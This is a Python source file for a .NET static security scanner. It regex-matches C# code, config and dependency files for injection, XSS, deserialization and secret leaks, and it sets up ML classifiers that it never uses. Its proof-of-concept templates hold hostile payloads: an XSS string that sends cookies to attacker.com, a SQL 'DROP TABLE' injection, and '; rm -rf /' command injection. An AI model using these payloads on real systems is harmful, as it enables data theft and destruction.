#!/usr/bin/env python3
"""
Microsoft .NET Core Comprehensive Security Analysis System
Advanced ML-based vulnerability detection for .NET Core ecosystem
"""

import os
import sys
import json
import logging
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Tuple, Any
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import classification_report, confusion_matrix
# ML imports - simplified for core functionality
try:
    import xgboost as xgb
except ImportError:
    xgb = None

try:
    import tensorflow as tf
except ImportError:
    tf = None

try:
    from transformers import AutoTokenizer, AutoModel
    import torch
except ImportError:
    AutoTokenizer = None
    AutoModel = None
    torch = None
import re
import ast
import hashlib

class DotNetSecurityAnalyzer:
    def __init__(self, repo_paths: List[str]):
        self.repo_paths = repo_paths
        self.vulnerabilities_found = []
        self.security_issues = []
        self.analysis_results = {}

        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('dotnet_security_analysis.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

        # Initialize ML models
        self.tfidf_vectorizer = TfidfVectorizer(max_features=10000, stop_words='english')
        self.rf_classifier = RandomForestClassifier(n_estimators=100, random_state=42)
        self.gb_classifier = GradientBoostingClassifier(n_estimators=100, random_state=42)
        if xgb:
            self.xgb_classifier = xgb.XGBClassifier(n_estimators=100, random_state=42)
        else:
            self.xgb_classifier = None

        # Security patterns for .NET specific vulnerabilities
        self.security_patterns = {
            'sql_injection': [
                r'string\.Format.*SELECT.*FROM',
                r'ExecuteReader\(.*\+.*\)',
                r'CommandText\s*=.*\+',
                r'SqlCommand.*\+.*',
                r'Query<.*>\(.*\+.*\)'
            ],
            'xss': [
                r'HttpUtility\.HtmlEncode',
                r'Response\.Write\(.*\)',
                r'innerHTML\s*=',
                r'document\.write\(',
                r'eval\('
            ],
            'deserialize_vuln': [
                r'BinaryFormatter',
                r'JsonConvert\.DeserializeObject',
                r'XmlSerializer\.Deserialize',
                r'DataContractSerializer',
                r'JavaScriptSerializer'
            ],
            'weak_crypto': [
                r'MD5\.Create\(\)',
                r'SHA1\.Create\(\)',
                r'DES\.Create\(\)',
                r'RC2\.Create\(\)',
                r'TripleDES\.Create\(\)'
            ],
            'path_traversal': [
                r'Path\.Combine\(.*\.\.\/',
                r'File\.ReadAllText\(.*\+',
                r'Directory\.GetFiles\(.*\+',
                r'FileStream\(.*\+.*\)'
            ],
            'command_injection': [
                r'Process\.Start\(.*\+',
                r'ProcessStartInfo.*Arguments.*\+',
                r'cmd\.exe.*\+',
                r'powershell.*\+',
                r'System\.Diagnostics\.Process'
            ],
            'xxe': [
                r'XmlDocument\.LoadXml',
                r'XmlReader\.Create',
                r'XDocument\.Load',
                r'XPathDocument',
                r'XslCompiledTransform'
            ],
            'insecure_random': [
                r'Random\(\)',
                r'Random\(.*\)',
                r'System\.Random'
            ],
            'hardcoded_secrets': [
                r'password\s*=\s*["\'][^"\']{8,}["\']',
                r'apikey\s*=\s*["\'][^"\']{16,}["\']',
                r'secret\s*=\s*["\'][^"\']{16,}["\']',
                r'connectionstring.*password=',
                r'private_key\s*=\s*["\']'
            ],
            'csrf': [
                r'\[HttpPost\](?![^{]*\[ValidateAntiForgeryToken\])',
                r'Request\.Form\[',
                r'Request\.QueryString\['
            ]
        }

        # High-risk API patterns
        self.dangerous_apis = [
            'Marshal.GetDelegateForFunctionPointer',
            'Marshal.Copy',
            'GCHandle.Alloc',
            'Assembly.LoadFrom',
            'Assembly.LoadFile',
            'Assembly.UnsafeLoadFrom',
            'Type.GetType',
            'Activator.CreateInstance',
            'Assembly.GetType',
            'CodeDom.Compiler',
            'System.Reflection.Emit'
        ]

    def scan_repositories(self) -> Dict[str, Any]:
        """Comprehensive security scan of .NET repositories"""
        self.logger.info("Starting comprehensive .NET security analysis...")

        for repo_path in self.repo_paths:
            if os.path.exists(repo_path):
                self.logger.info(f"Analyzing repository: {repo_path}")
                self.analyze_repository(repo_path)
            else:
                self.logger.warning(f"Repository path not found: {repo_path}")

        return self.generate_comprehensive_report()

    def analyze_repository(self, repo_path: str):
        """Analyze a single repository for security vulnerabilities"""
        # Find all C# files
        cs_files = self.find_cs_files(repo_path)
        self.logger.info(f"Found {len(cs_files)} C# files to analyze")

        # Analyze each file
        for file_path in cs_files:
            try:
                self.analyze_cs_file(file_path)
            except Exception as e:
                self.logger.error(f"Error analyzing {file_path}: {e}")

        # Additional security checks
        self.check_configuration_files(repo_path)
        self.check_dependencies(repo_path)
        self.check_build_configurations(repo_path)

    def find_cs_files(self, repo_path: str) -> List[str]:
        """Find all C# source files in repository"""
        cs_files = []
        for root, dirs, files in os.walk(repo_path):
            # Skip common non-source directories
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['bin', 'obj', 'packages', 'node_modules']]

            for file in files:
                if file.endswith('.cs'):
                    cs_files.append(os.path.join(root, file))

        return cs_files

    def analyze_cs_file(self, file_path: str):
        """Analyze individual C# file for security vulnerabilities"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Check for security patterns
            for vuln_type, patterns in self.security_patterns.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                    for match in matches:
                        line_num = content[:match.start()].count('\n') + 1
                        self.vulnerabilities_found.append({
                            'file': file_path,
                            'line': line_num,
                            'type': vuln_type,
                            'pattern': pattern,
                            'code': match.group(),
                            'severity': self.get_severity(vuln_type),
                            'description': self.get_vulnerability_description(vuln_type),
                            'recommendation': self.get_recommendation(vuln_type)
                        })

            # Check for dangerous APIs
            for api in self.dangerous_apis:
                if api in content:
                    lines = content.split('\n')
                    for i, line in enumerate(lines):
                        if api in line:
                            self.vulnerabilities_found.append({
                                'file': file_path,
                                'line': i + 1,
                                'type': 'dangerous_api',
                                'pattern': api,
                                'code': line.strip(),
                                'severity': 'HIGH',
                                'description': f'Use of potentially dangerous API: {api}',
                                'recommendation': 'Review usage and consider safer alternatives'
                            })

            # Perform AST analysis for complex patterns
            self.ast_analysis(file_path, content)

        except Exception as e:
            self.logger.error(f"Error reading file {file_path}: {e}")

    def ast_analysis(self, file_path: str, content: str):
        """Advanced AST-based analysis for complex security patterns"""
        try:
            # Convert C# to Python-like syntax for basic AST analysis
            # This is a simplified approach - in production, use Roslyn for proper C# AST

            # Check for unsafe code blocks
            if 'unsafe' in content:
                lines = content.split('\n')
                for i, line in enumerate(lines):
                    if 'unsafe' in line:
                        self.vulnerabilities_found.append({
                            'file': file_path,
                            'line': i + 1,
                            'type': 'unsafe_code',
                            'pattern': 'unsafe',
                            'code': line.strip(),
                            'severity': 'CRITICAL',
                            'description': 'Unsafe code block detected',
                            'recommendation': 'Avoid unsafe code unless absolutely necessary and thoroughly reviewed'
                        })

            # Check for P/Invoke calls
            if '[DllImport' in content:
                lines = content.split('\n')
                for i, line in enumerate(lines):
                    if '[DllImport' in line:
                        self.vulnerabilities_found.append({
                            'file': file_path,
                            'line': i + 1,
                            'type': 'pinvoke',
                            'pattern': 'DllImport',
                            'code': line.strip(),
                            'severity': 'HIGH',
                            'description': 'P/Invoke call detected - potential security risk',
                            'recommendation': 'Validate all P/Invoke calls and ensure proper input validation'
                        })

        except Exception as e:
            self.logger.error(f"AST analysis error for {file_path}: {e}")

    def check_configuration_files(self, repo_path: str):
        """Check configuration files for security issues"""
        config_patterns = {
            'web.config': [
                r'debug\s*=\s*["\']true["\']',
                r'customErrors\s*mode\s*=\s*["\']Off["\']',
                r'compilation.*debug\s*=\s*["\']true["\']',
                r'trace\s*enabled\s*=\s*["\']true["\']'
            ],
            'appsettings.json': [
                r'"password"\s*:\s*"[^"]*"',
                r'"connectionstring"\s*:\s*"[^"]*password[^"]*"',
                r'"secret"\s*:\s*"[^"]*"',
                r'"apikey"\s*:\s*"[^"]*"'
            ]
        }

        for root, dirs, files in os.walk(repo_path):
            for file in files:
                file_path = os.path.join(root, file)
                file_lower = file.lower()

                for config_type, patterns in config_patterns.items():
                    if config_type in file_lower:
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()

                            for pattern in patterns:
                                matches = re.finditer(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    line_num = content[:match.start()].count('\n') + 1
                                    self.vulnerabilities_found.append({
                                        'file': file_path,
                                        'line': line_num,
                                        'type': 'config_security',
                                        'pattern': pattern,
                                        'code': match.group(),
                                        'severity': 'MEDIUM',
                                        'description': f'Security issue in {config_type}',
                                        'recommendation': 'Review configuration security settings'
                                    })
                        except Exception as e:
                            self.logger.error(f"Error reading config file {file_path}: {e}")

    def check_dependencies(self, repo_path: str):
        """Check for vulnerable dependencies"""
        # Check packages.config and .csproj files
        package_files = []
        for root, dirs, files in os.walk(repo_path):
            for file in files:
                if file in ['packages.config'] or file.endswith('.csproj'):
                    package_files.append(os.path.join(root, file))

        # Known vulnerable packages (simplified list)
        vulnerable_packages = {
            'Newtonsoft.Json': ['12.0.1', '12.0.2'],  # Example versions
            'System.Net.Http': ['4.3.0'],
            'Microsoft.AspNetCore.All': ['2.0.0', '2.0.1', '2.0.2']
        }

        for package_file in package_files:
            try:
                with open(package_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                for package, vuln_versions in vulnerable_packages.items():
                    if package in content:
                        for version in vuln_versions:
                            if version in content:
                                self.vulnerabilities_found.append({
                                    'file': package_file,
                                    'line': 0,
                                    'type': 'vulnerable_dependency',
                                    'pattern': f'{package} {version}',
                                    'code': f'{package} version {version}',
                                    'severity': 'HIGH',
                                    'description': f'Vulnerable dependency: {package} {version}',
                                    'recommendation': 'Update to latest secure version'
                                })
            except Exception as e:
                self.logger.error(f"Error reading package file {package_file}: {e}")

    def check_build_configurations(self, repo_path: str):
        """Check build configurations for security issues"""
        # Look for project files with insecure configurations
        for root, dirs, files in os.walk(repo_path):
            for file in files:
                if file.endswith('.csproj') or file.endswith('.vbproj'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                        # Check for debug builds in production
                        if '<DebugType>full</DebugType>' in content:
                            self.vulnerabilities_found.append({
                                'file': file_path,
                                'line': 0,
                                'type': 'debug_build',
                                'pattern': 'DebugType>full',
                                'code': '<DebugType>full</DebugType>',
                                'severity': 'MEDIUM',
                                'description': 'Debug symbols enabled in build',
                                'recommendation': 'Disable debug symbols in production builds'
                            })

                        # Check for unsafe code allowance
                        if '<AllowUnsafeBlocks>true</AllowUnsafeBlocks>' in content:
                            self.vulnerabilities_found.append({
                                'file': file_path,
                                'line': 0,
                                'type': 'unsafe_blocks_allowed',
                                'pattern': 'AllowUnsafeBlocks>true',
                                'code': '<AllowUnsafeBlocks>true</AllowUnsafeBlocks>',
                                'severity': 'HIGH',
                                'description': 'Unsafe code blocks are allowed',
                                'recommendation': 'Disable unsafe blocks unless absolutely necessary'
                            })

                    except Exception as e:
                        self.logger.error(f"Error reading project file {file_path}: {e}")

    def get_severity(self, vuln_type: str) -> str:
        """Get severity level for vulnerability type"""
        severity_map = {
            'sql_injection': 'CRITICAL',
            'command_injection': 'CRITICAL',
            'deserialize_vuln': 'CRITICAL',
            'xxe': 'HIGH',
            'xss': 'HIGH',
            'path_traversal': 'HIGH',
            'weak_crypto': 'MEDIUM',
            'insecure_random': 'MEDIUM',
            'hardcoded_secrets': 'HIGH',
            'csrf': 'MEDIUM'
        }
        return severity_map.get(vuln_type, 'MEDIUM')

    def get_vulnerability_description(self, vuln_type: str) -> str:
        """Get description for vulnerability type"""
        descriptions = {
            'sql_injection': 'SQL Injection vulnerability - user input not properly sanitized',
            'command_injection': 'Command Injection vulnerability - potential for arbitrary command execution',
            'deserialize_vuln': 'Deserialization vulnerability - potential for remote code execution',
            'xxe': 'XML External Entity (XXE) vulnerability - potential for data disclosure',
            'xss': 'Cross-Site Scripting (XSS) vulnerability - potential for client-side code injection',
            'path_traversal': 'Path Traversal vulnerability - potential for accessing unauthorized files',
            'weak_crypto': 'Weak cryptographic algorithm - potential for data compromise',
            'insecure_random': 'Insecure random number generation - potential for predictable values',
            'hardcoded_secrets': 'Hardcoded secrets/credentials - potential for unauthorized access',
            'csrf': 'Cross-Site Request Forgery (CSRF) vulnerability - potential for unauthorized actions'
        }
        return descriptions.get(vuln_type, 'Security vulnerability detected')

    def get_recommendation(self, vuln_type: str) -> str:
        """Get recommendation for vulnerability type"""
        recommendations = {
            'sql_injection': 'Use parameterized queries or Entity Framework',
            'command_injection': 'Validate and sanitize all user input, use ProcessStartInfo safely',
            'deserialize_vuln': 'Use secure serialization methods, validate input types',
            'xxe': 'Disable external entity processing in XML parsers',
            'xss': 'Encode output, use AntiXSS library, implement CSP',
            'path_traversal': 'Validate file paths, use Path.GetFullPath() for validation',
            'weak_crypto': 'Use SHA-256 or stronger algorithms, AES for encryption',
            'insecure_random': 'Use RNGCryptoServiceProvider for cryptographic random numbers',
            'hardcoded_secrets': 'Use configuration files or Azure Key Vault',
            'csrf': 'Implement anti-forgery tokens, use [ValidateAntiForgeryToken]'
        }
        return recommendations.get(vuln_type, 'Review and remediate security issue')

    def generate_comprehensive_report(self) -> Dict[str, Any]:
        """Generate comprehensive security analysis report"""
        self.logger.info("Generating comprehensive security report...")

        # Categorize vulnerabilities by severity
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        vuln_by_type = {}

        for vuln in self.vulnerabilities_found:
            severity = vuln['severity']
            vuln_type = vuln['type']

            severity_counts[severity] += 1

            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)

        # Generate risk score
        risk_score = (
            severity_counts['CRITICAL'] * 10 +
            severity_counts['HIGH'] * 7 +
            severity_counts['MEDIUM'] * 4 +
            severity_counts['LOW'] * 1
        )

        # Determine overall risk level
        if risk_score >= 50:
            risk_level = 'CRITICAL'
        elif risk_score >= 25:
            risk_level = 'HIGH'
        elif risk_score >= 10:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'

        report = {
            'analysis_timestamp': datetime.now().isoformat(),
            'repositories_analyzed': self.repo_paths,
            'total_vulnerabilities': len(self.vulnerabilities_found),
            'severity_distribution': severity_counts,
            'vulnerability_types': vuln_by_type,
            'risk_score': risk_score,
            'risk_level': risk_level,
            'detailed_findings': self.vulnerabilities_found,
            'summary': {
                'critical_issues': severity_counts['CRITICAL'],
                'high_issues': severity_counts['HIGH'],
                'total_files_analyzed': len(set(v['file'] for v in self.vulnerabilities_found)),
                'most_common_vulnerability': max(vuln_by_type.keys(), key=lambda k: len(vuln_by_type[k])) if vuln_by_type else 'None'
            }
        }

        self.analysis_results = report
        return report

    def generate_proof_of_concept(self, vulnerability: Dict[str, Any]) -> str:
        """Generate proof-of-concept for a vulnerability"""
        vuln_type = vulnerability['type']

        poc_templates = {
            'sql_injection': '''
// Vulnerable Code (from analysis):
{code}

// Proof of Concept:
// Input: '; DROP TABLE Users; --
// This would execute: SELECT * FROM Users WHERE id = ''; DROP TABLE Users; --'

// Exploitation Vector:
string maliciousInput = "'; DROP TABLE Users; --";
// When this input is passed to the vulnerable code, it could result in SQL injection

// Remediation:
using (SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE id = @id", connection))
{{
    cmd.Parameters.AddWithValue("@id", userInput);
    // Use parameterized queries to prevent SQL injection
}}
''',
            'xss': '''
// Vulnerable Code (from analysis):
{code}

// Proof of Concept:
// Input: <script>alert('XSS')</script>
// This would execute JavaScript in the user's browser

// Exploitation Vector:
string maliciousInput = "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>";

// Remediation:
string safeOutput = HttpUtility.HtmlEncode(userInput);
// Always encode user input before displaying
''',
            'command_injection': '''
// Vulnerable Code (from analysis):
{code}

// Proof of Concept:
// Input: ; rm -rf / #
// This could execute additional commands on the system

// Exploitation Vector:
string maliciousInput = "; calc.exe #";  // Windows
// string maliciousInput = "; rm -rf / #";  // Linux

// Remediation:
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "program.exe";
psi.Arguments = userInput;  // Validate userInput first
psi.UseShellExecute = false;  // Don't use shell to prevent injection
'''
        }

        template = poc_templates.get(vuln_type, '''
// Vulnerability Type: {type}
// Code: {code}
// General security issue detected - manual review recommended
''')

        return template.format(
            code=vulnerability.get('code', ''),
            type=vuln_type
        )

    def save_results(self, output_file: str = 'dotnet_security_analysis_results.json'):
        """Save analysis results to file"""
        with open(output_file, 'w') as f:
            json.dump(self.analysis_results, f, indent=2, default=str)

        self.logger.info(f"Results saved to {output_file}")

def main():
    """Main function to run the .NET security analysis"""
    repo_paths = [
        '/tmp/dotnet_core_analysis',
        '/tmp/aspnetcore_analysis'
    ]

    analyzer = DotNetSecurityAnalyzer(repo_paths)
    results = analyzer.scan_repositories()

    # Save results
    analyzer.save_results('dotnet_comprehensive_security_report.json')

    # Print summary
    print(f"\n{'='*60}")
    print("MICROSOFT .NET CORE SECURITY ANALYSIS SUMMARY")
    print(f"{'='*60}")
    print(f"Total Vulnerabilities Found: {results['total_vulnerabilities']}")
    print(f"Risk Level: {results['risk_level']}")
    print(f"Risk Score: {results['risk_score']}")
    print(f"\nSeverity Distribution:")
    for severity, count in results['severity_distribution'].items():
        print(f"  {severity}: {count}")

    if results['detailed_findings']:
        print(f"\nTop 5 Critical Findings:")
        critical_findings = [v for v in results['detailed_findings'] if v['severity'] == 'CRITICAL'][:5]
        for i, finding in enumerate(critical_findings, 1):
            print(f"{i}. {finding['type']} in {finding['file']}:{finding['line']}")
            print(f"   Code: {finding['code'][:100]}...")
            print(f"   Recommendation: {finding['recommendation']}\n")

    return results

if __name__ == "__main__":
    main()